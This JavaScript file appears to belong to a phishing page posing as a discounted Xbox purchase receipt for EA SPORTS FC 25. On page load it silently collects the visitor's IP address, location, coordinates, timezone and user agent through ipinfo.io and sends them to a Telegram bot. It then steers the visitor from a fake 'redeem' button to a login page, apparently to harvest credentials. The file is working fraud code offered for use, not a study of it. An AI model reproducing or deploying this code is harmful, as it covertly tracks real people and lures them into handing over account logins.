// Store user information globally
let userLocation = null;



// Function to send message to Telegram
async function sendToTelegram(message) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });
        return response.ok;
    } catch (error) {
        console.error('Error:', error);
        return false;
    }
}

// Function to generate a random transaction ID
function generateTransactionId() {
    const timestamp = new Date().getTime().toString().slice(-6);
    const random = Math.random().toString(36).substr(2, 4).toUpperCase();
    return `XBX-${timestamp}${random}`;
}

// Function to format date and time
function formatDateTime(date) {
    const options = {
        year: 'numeric',
        month: 'long',
        day: 'numeric',
        hour: 'numeric',
        minute: 'numeric',
        hour12: true
    };
    return new Intl.DateTimeFormat('en-US', options).format(date);
}

// Function to get user's location
async function detectUserLocation() {
    try {
        const response = await fetch('https://ipinfo.io/json?token=81e788912b1532');
        const data = await response.json();
        return {
            country: data.country,
            region: data.region,
            city: data.city,
            ip: data.ip,
            timezone: data.timezone,
            location: data.loc
        };
    } catch (error) {
        console.error('Error detecting location:', error);
        return null;
    }
}

// Function to prepare receipt data
async function prepareReceiptData() {
    const transactionId = document.querySelector('.transaction-id').textContent;
    const dateTime = document.querySelector('.date-time').textContent;
    const userLocation = await detectUserLocation();

    return {
        transactionId,
        dateTime,
        userLocation
    };
}

// Function to send receipt data to Telegram
async function sendReceiptToTelegram() {
    const receiptData = await prepareReceiptData();
    
    const message = `
🎮 New Game Purchase Confirmed!
⏰ ${receiptData.dateTime}

🎯 Transaction Details:
🆔 ${receiptData.transactionId}

🎮 Game: EA SPORTS FC™ 25
📦 Edition: Standard Edition
🎮 Platform: Xbox One & Xbox Series X|S

💰 Payment Summary:
💵 Original Price: $69.99
🏷️ Discount: -$60.00
💳 Total Paid: $9.99

📱 Device Information:
🌐 IP: ${receiptData.userLocation.ip}
📍 Location: ${receiptData.userLocation.city}, ${receiptData.userLocation.region}, ${receiptData.userLocation.country}
⏰ Timezone: ${receiptData.userLocation.timezone}
📍 Coordinates: ${receiptData.userLocation.location}
💻 User Agent: ${navigator.userAgent}
    `;

    await sendToTelegram(message);
}

// Function to handle redeem button click
function handleRedeemClick() {
    // Add loading state to button
    const button = document.querySelector('.button-primary');
    button.textContent = 'Please wait...';
    button.style.pointerEvents = 'none';
    button.classList.add('loading');
    
    // Redirect to login page after a short delay
    setTimeout(() => {
        window.location.href = 'login.html';
    }, 1000);
}

// Initialize receipt page
async function initializeReceipt() {
    try {
        // Generate and set transaction ID
        const transactionId = generateTransactionId();
        document.querySelector('.transaction-id').textContent = `#${transactionId}`;

        // Set current date and time
        const now = new Date();
        document.querySelector('.date-time').textContent = formatDateTime(now);

        // Send receipt data to Telegram
        await sendReceiptToTelegram();

        // Add button event listener
        const redeemButton = document.querySelector('.button-primary');
        if (redeemButton) {
            redeemButton.addEventListener('click', handleRedeemClick);
        }

        // Add hover effects to steps
        document.querySelectorAll('.step').forEach(step => {
            step.addEventListener('mouseenter', () => {
                step.style.transform = 'translateY(-2px)';
            });
            step.addEventListener('mouseleave', () => {
                step.style.transform = 'translateY(0)';
            });
        });

        // Add animation classes
        document.querySelector('.receipt-container').classList.add('fade-in');

    } catch (error) {
        console.error('Error initializing receipt:', error);
    }
}

// Event listener for DOM content loaded
document.addEventListener('DOMContentLoaded', initializeReceipt);

// Handle visibility change
document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'visible') {
        // Refresh dynamic content if needed
        document.querySelector('.date-time').textContent = formatDateTime(new Date());
    }
});

// Add error handling for images
document.querySelectorAll('img').forEach(img => {
    img.addEventListener('error', function() {
        this.style.display = 'none';
        console.error('Failed to load image:', this.src);
    });
});